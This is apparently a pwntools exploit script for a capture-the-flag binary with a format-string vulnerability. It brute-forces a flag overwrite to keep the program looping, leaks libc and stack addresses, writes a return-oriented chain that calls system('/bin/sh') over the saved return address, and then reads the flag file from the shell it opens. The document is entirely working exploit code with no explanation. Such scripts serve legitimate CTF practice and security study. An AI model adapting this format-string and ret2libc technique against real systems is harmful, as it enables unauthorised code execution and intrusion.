#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'yet_another_fsb_patched'
HOST = 'example.com'
PORT = 1337

exe = ELF(exe_path, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]
context.log_level = 'error'

gdbscript = '''
continue
'''

def start(attach_gdb=False):
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB and attach_gdb:
        gdb.attach(p, gdbscript=gdbscript)
        context.log_level = 'debug'
        # input()
    return p

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# gadgets
ret = 0x000000000040101a
leave_ret = 0x00000000004011fd
mov_eax_0_leave_ret = 0x00000000004011f8
pop_rbp = 0x000000000040112d
add_ptr_rbp = 0x000000000040112c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret

bss = 0x4041a0

p = None
while True:
    p = start(attach_gdb=False)
    # overwrite flag to loop
    payload = b'%41$p.%c%8$hhn' + b'A'*2 + p8(0xae)
    try:
        s(payload) 
        output = p.recvuntil(b'A'*2, timeout=0.5)
        if b'.' in output:
            sl(b"TEST")
            if p.recvuntil(b'TEST', timeout=0.5):
                print("successfully")   
                break
            
    except EOFError:
        pass
    p.close()

# log.success(b'outside!')

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    context.log_level = 'debug'

# leak stack and libc
leak = output.split(b'.')[0].split()[-1].decode()
libc.address = int(leak, 16) - 0x25c88
sl(b'%79$p.%27$p')
p.recvuntil(b'AA')
p.recvuntil(b'0x')
stack_leak = p.recvuntil(b'\x2e', drop=True)
stack = int((b'0x' + stack_leak).decode(), 16) - 0x20f72
leak = p.recvuntil(b'\x0a', drop=True)
srip = int(leak.decode(), 16) + 0x40

# print(f'libc: {hex(libc.address)}')
# print(f'stack: {hex(stack)}')
# print(f'saved rip: {hex(srip)}')
# ROP
system = libc.sym['system']
pop_rdi = 0x0fd8c4+libc.address
binsh = next(libc.search(b'/bin/sh'))

offset = 6
payload = fmtstr_payload(offset, {srip: pop_rdi, srip + 0x8: binsh, srip + 0x10: ret, srip + 0x18: system}, write_size='short')
sl(payload)
# log.success(b'payload 1 sent!')
payload = fmtstr_payload(offset, {srip - 0xa : 0x0}, write_size='short')
sl(payload)
# log.success(b'flag = 0')

sl(b'cat flag*')

p.interactive()